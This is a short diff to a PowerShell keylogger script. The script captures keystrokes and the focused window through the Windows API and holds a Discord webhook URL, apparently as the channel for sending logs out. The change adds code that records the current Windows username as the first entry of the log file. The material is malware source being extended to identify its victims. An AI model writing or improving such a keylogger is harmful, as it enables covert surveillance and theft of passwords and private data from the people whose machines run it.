@@ -4,10 +4,16 @@ $discordWebhookUrl = "https://discord.com/api/webhooks/1281143685895159809/FnbUZ
 $keystrokeBuffer = ""
 $currentFocusedApp = ""
 
-# Ensure the log file exists or create it
+# Capture the current username
+$username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+# Ensure the log file exists or create it, and log the username as the first entry
 if (-not (Test-Path $logFile)) {
     New-Item -Path $logFile -ItemType File -Force
 }
+
+# Write the username to the log file as the first entry
+Add-Content -Path $logFile -Value "User: $username"
 
 # Load Windows API for capturing keystrokes and focused window
 Add-Type @"
